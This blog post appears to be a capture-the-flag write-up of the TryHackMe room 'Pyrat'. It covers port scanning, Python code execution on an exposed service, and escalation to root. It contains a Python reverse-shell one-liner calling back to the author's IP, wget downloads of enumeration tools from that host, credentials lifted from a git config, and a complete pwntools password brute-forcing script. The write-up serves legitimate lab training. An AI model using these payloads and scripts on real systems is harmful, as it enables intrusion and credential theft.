@@ -1,0 +1,429 @@
+---
+layout: post
+title:  "Pyrat (THM)"
+date:   2025-09-24 17:53:43 -0400
+author: robo.uzi
+tags: [CTF, TryHackMe]
+---
+
+**Description:** Pyrat receives a curious response from an HTTP server, which leads to a potential Python code execution vulnerability. With a cleverly crafted payload, it is possible to gain a shell on the machine. Delving into the directories, the author uncovers a well-known folder that provides a user with access to credentials. A subsequent exploration yields valuable insights into the application's older version. Exploring possible endpoints using a custom script, the user can discover a special endpoint and ingeniously expand their exploration by fuzzing passwords. The script unveils a password, ultimately granting access to the root.
+## Initial Access
+
+`nmap -p- -T5 -vv 10.10.154.107 -oN pyratfullnmap.txt`
+
+`nmap -sV -sC -p 22,8000 -T4 -vv 10.10.154.107 -oN pyratnmap.txt`:
+```shell
+PORT     STATE SERVICE  REASON  VERSION  
+22/tcp   open  ssh      syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8000/tcp open  http-alt syn-ack SimpleHTTP/0.6 Python/3.11.2  
+|_http-favicon: Unknown favicon MD5: FBD3DB4BEF1D598ED90E26610F23A63F  
+|_http-server-header: SimpleHTTP/0.6 Python/3.11.2  
+|_http-open-proxy: Proxy might be redirecting requests  
+|_http-title: Site doesnt have a title (text/html; charset=utf-8).  
+| fingerprint-strings:    
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop:    
+|     source code string cannot contain null bytes  
+|   FourOhFourRequest, LPDString, SIPOptions:    
+|     invalid syntax (<string>, line 1)  
+|   GetRequest:    
+|     name 'GET' is not defined  
+|   HTTPOptions, RTSPRequest:    
+|     name 'OPTIONS' is not defined  
+|   Help:    
+|_    name 'HELP' is not defined  
+| http-methods:    
+|_  Supported Methods: GET HEAD POST OPTIONS  
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :  
+SF-Port8000-TCP:V=7.94SVN%I=7%D=9/23%Time=68D334E1%P=x86_64-pc-linux-gnu%r  
+SF:(GenericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20de  
+SF:fined\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\  
+SF:x20null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<st  
+SF:ring>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cann  
+SF:ot\x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\  
+SF:x20is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x  
+SF:20not\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20strin  
+SF:g\x20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"s  
+SF:ource\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Hel  
+SF:p,1B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invali  
+SF:d\x20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\  
+SF:x20syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20  
+SF:code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,  
+SF:"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(J  
+SF:avaRMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20byt  
+SF:es\n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\  
+SF:x20bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x  
+SF:20null\x20bytes\n");  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Visiting port `8000` I see this:
+```shell
+http -v http://10.10.154.107:8000/  
+GET / HTTP/1.1  
+Accept: */*  
+Accept-Encoding: gzip, deflate  
+Connection: keep-alive  
+Host: 10.10.154.107:8000  
+User-Agent: HTTPie/3.2.2  
+
+HTTP/1.0 200 OK  
+Content-Length: 27  
+Content-type: text/html; charset=utf-8  
+Date: Wed Sep 24 00:06:51  2025  
+Server: SimpleHTTP/0.6 Python/3.11.2  
+
+Try a more basic connection
+```
+
+I find when connecting to port `8000` with `nc` I can execute python:
+```shell
+nc 10.10.154.107 8000  
+print(open('/etc/passwd').read())  
+root:x:0:0:root:/root:/bin/bash  
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
+bin:x:2:2:bin:/bin:/usr/sbin/nologin  
+sys:x:3:3:sys:/dev:/usr/sbin/nologin  
+sync:x:4:65534:sync:/bin:/bin/sync  
+games:x:5:60:games:/usr/games:/usr/sbin/nologin  
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin  
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
+...
+```
+
+After some time I find a payload which gets me reverse shell:
+```shell
+nc 10.10.154.107 8000  
+import socket,subprocess,os;s=socket.socket();s.connect(('10.13.66.123',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])
+```
+
+```shell
+nc -lvnp 1337  
+Listening on 0.0.0.0 1337  
+Connection received on 10.10.154.107 44070  
+/bin/sh: 0: can't access tty; job control turned off  
+$ id  
+uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+$
+```
+
+I fix my shell with:
+```shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+CTRL+Z
+stty raw -echo; fg
+```
+
+After looking for obvious privilege escalation vectors (suid binaries, sudo -l, netstat -a, crontabs), I dont find anything. I start a local python server and put `linpeas.sh` and `pspy64` on the target machine:
+```shell
+www-data@ip-10-10-154-107:/tmp$ wget http://10.13.66.123:8000/linpeas.sh  
+--2025-09-24 00:30:53--  http://10.13.66.123:8000/linpeas.sh  
+Connecting to 10.13.66.123:8000... connected.  
+HTTP request sent, awaiting response... 200 OK  
+Length: 840139 (820K) [text/x-sh]  
+Saving to: ‘linpeas.sh’  
+  
+linpeas.sh          100%[===================>] 820.45K   452KB/s    in 1.8s      
+
+2025-09-24 00:30:56 (452 KB/s) - ‘linpeas.sh’ saved [840139/840139]  
+  
+www-data@ip-10-10-154-107:/tmp$ wget http://10.13.66.123:8000/pspy64  
+--2025-09-24 00:31:04--  http://10.13.66.123:8000/pspy64  
+Connecting to 10.13.66.123:8000... connected.  
+HTTP request sent, awaiting response... 200 OK  
+Length: 3104768 (3.0M) [application/octet-stream]  
+Saving to: ‘pspy64’  
+  
+pspy64              100%[===================>]   2.96M   773KB/s    in 3.9s       
+2025-09-24 00:31:08 (773 KB/s) - ‘pspy64’ saved [3104768/3104768]
+```
+
+Running `pspy64` I see `pyrat.py` being ran when I connect to port `8000`:
+```shell
+2025/09/24 00:37:14 CMD: UID=0     PID=2114   | python3 /root/pyrat.py
+```
+
+Useful `linpeas.sh` output:
+```shell
+╔══════════╣ Analyzing Github Files
+drwxrwxr-x 8 think think 4096 Jun 21  2023 /opt/dev/.git
+```
+
+In `/opt/dev/.git/config` I find hardcoded credentials for the user `think`:
+```shell
+www-data@ip-10-10-154-107:/opt/dev/.git$ cat config  
+[core]  
+       repositoryformatversion = 0  
+       filemode = true  
+       bare = false  
+       logallrefupdates = true  
+[user]  
+       name = Jose Mario  
+       email = josemlwdf@github.com  
+  
+[credential]  
+       helper = cache --timeout=3600  
+  
+[credential "https://github.com"]  
+       username = think  
+       password = redacted
+```
+`think:redacted`. Run `su think` and become this user.
+
+I find `/var/mail/think` which contains an interesting message:
+```shell
+think@ip-10-10-154-107:/tmp$ cat /var/mail/think     
+From root@pyrat  Thu Jun 15 09:08:55 2023  
+Return-Path: <root@pyrat>  
+X-Original-To: think@pyrat  
+Delivered-To: think@pyrat  
+Received: by pyrat.localdomain (Postfix, from userid 0)  
+       id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)  
+Subject: Hello  
+To: <think@pyrat>  
+X-Mailer: mail (GNU Mailutils 3.7)  
+Message-Id: <20230615090855.2E4312141@pyrat.localdomain>  
+Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)  
+From: Dbile Admen <root@pyrat>  
+  
+Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
+```
+
+In `/opt/dev` I run `git status` and see a deleted file. I restore it:
+```shell
+think@ip-10-10-154-107:/opt/dev$ git status  
+On branch master  
+Changes not staged for commit:  
+ (use "git add/rm <file>..." to update what will be committed)  
+ (use "git restore <file>..." to discard changes in working directory)  
+ deleted:    pyrat.py.old  
+  
+no changes added to commit (use "git add" and/or "git commit -a")  
+think@ip-10-10-154-107:/opt/dev$ git restore pyrat.py.old  
+think@ip-10-10-154-107:/opt/dev$ ls  
+pyrat.py.old  
+think@ip-10-10-154-107:/opt/dev$ cat pyrat.py.old  
+...............................................  
+  
+def switch_case(client_socket, data):  
+   if data == 'some_endpoint':  
+       get_this_enpoint(client_socket)  
+   else:  
+       # Check socket is admin and downgrade if is not aprooved  
+       uid = os.getuid()  
+       if (uid == 0):  
+           change_uid()  
+  
+       if data == 'shell':  
+           shell(client_socket)  
+       else:  
+           exec_python(client_socket, data)  
+  
+def shell(client_socket):  
+   try:  
+       import pty  
+       os.dup2(client_socket.fileno(), 0)  
+       os.dup2(client_socket.fileno(), 1)  
+       os.dup2(client_socket.fileno(), 2)  
+       pty.spawn("/bin/sh")  
+   except Exception as e:  
+       send_data(client_socket, e  
+  
+...............................................
+```
+
+So connecting to port `8000` and sending `shell` gives you a shell:
+```shell
+nc 10.10.167.123 8000  
+shell  
+$ id  
+id  
+uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+$ ^C
+```
+
+I keep testing and luckily when I send `admin` it prompts me to enter a password:
+```shell
+nc 10.10.154.107 8000  
+admin  
+Password:  
+test1  
+Password:  
+test2  
+Password:  
+test3  
+admin  
+Password:  
+test4  
+Password:  
+test5  
+Password:  
+test6    
+admin  
+Password:  
+test7  
+Password:  
+^C
+```
+I can enter 3 wrong passwords before I need to enter `admin` again. 
+
+Run this script to get the password for an admin shell:
+```python
+#!/usr/bin/env python3
+from pwn import *
+from itertools import islice
+import time
+import sys
+
+context.log_level = "info"
+
+host = "10.10.167.123"
+port = 8000
+password_file = "/usr/share/wordlists/rockyou.txt"
+
+def connect_to_service():
+    return remote(host, port, timeout=5)
+
+def batches(fileobj, n=3):
+    while True:
+        batch = list(islice(fileobj, n))
+        if not batch:
+            break
+        yield [w.rstrip("\n") for w in batch]
+
+def collect_response(conn, timeout=2.0, chunk_timeout=0.25):
+    end = time.time() + timeout
+    collected = b""
+    while time.time() < end:
+        try:
+            part = conn.recv(timeout=chunk_timeout)
+        except EOFError:
+            raise
+        except Exception:
+            part = b""
+        if part:
+            collected += part
+            continue
+    return collected
+
+def attempt_batch(batch, batch_num):
+    try:
+        conn = connect_to_service()
+    except Exception as e:
+        print(f"[!] Connection error: {e}")
+        return False
+
+    try:
+        conn.sendline(b"admin")
+        try:
+            conn.recvuntil(b"Password:", timeout=3)
+        except Exception:
+            conn.close()
+            return False
+
+        for pw in batch:
+            print(f"[{batch_num}] trying: {pw}")
+            conn.sendline(pw.encode())
+
+            try:
+                resp = collect_response(conn, timeout=2.0)
+            except EOFError:
+                conn.close()
+                return False
+
+            if b"Password:" in resp:
+                continue
+
+            if not resp or resp.strip() == b"":
+                conn.close()
+                return False
+
+            print(f"Found valid password: {pw}")
+            try:
+                print("Received:")
+                print(resp.decode(errors="replace").strip())
+            except Exception:
+                pass
+            conn.interactive()
+            return True
+
+        conn.close()
+        return False
+
+    except KeyboardInterrupt:
+        try:
+            conn.close()
+        except:
+            pass
+        raise
+    except Exception as e:
+        print(f"Error during batch: {e}")
+        try:
+            conn.close()
+        except:
+            pass
+        return False
+
+def fuzz_passwords():
+    with open(password_file, "r", encoding="latin-1") as f:
+        batch_num = 0
+        for batch in batches(f, 3):
+            batch_num += 1
+            if attempt_batch(batch, batch_num):
+                return
+            time.sleep(0.1)
+    print("How did we get here?")
+
+if __name__ == "__main__":
+    fuzz_passwords()
+```
+The script connects, sends `admin`, trys 3 passwords from `rockyou.txt`, and checks the response. If no correct password is found it closes the connection and opens a new one. Then guesses 3 more times. If a correct password is found, it switches to interactive mode and gives me a shell as admin.
+
+Here is what I get:
+```shell
+python3 admin-login.py  
+[+] Opening connection to 10.10.167.123 on port 8000: Done  
+[1] trying: 123456  
+[1] trying: 12345  
+[1] trying: 123456789  
+[*] Closed connection to 10.10.167.123 port 8000  
+[+] Opening connection to 10.10.167.123 on port 8000: Done  
+[2] trying: password  
+[2] trying: iloveyou  
+[2] trying: princess  
+[*] Closed connection to 10.10.167.123 port 8000  
+[+] Opening connection to 10.10.167.123 on port 8000: Done  
+[3] trying: 1234567  
+[3] trying: rockyou  
+[3] trying: 12345678  
+[*] Closed connection to 10.10.167.123 port 8000  
+[+] Opening connection to 10.10.167.123 on port 8000: Done  
+[4] trying: redacted  
+Found valid password: redacted  
+Received:  
+Welcome Admin!!! Type "shell" to begin  
+[*] Switching to interactive mode  
+$ shell  
+# $ id  
+id  
+uid=0(root) gid=0(root) groups=0(root)  
+# $ ls  
+ls  
+pyrat.py  root.txt  snap  
+# $ cat root.txt  
+cat root.txt  
+redacted  
+# $    
+[*] Interrupted  
+[*] Closed connection to 10.10.167.123 port 8000
+```
+___
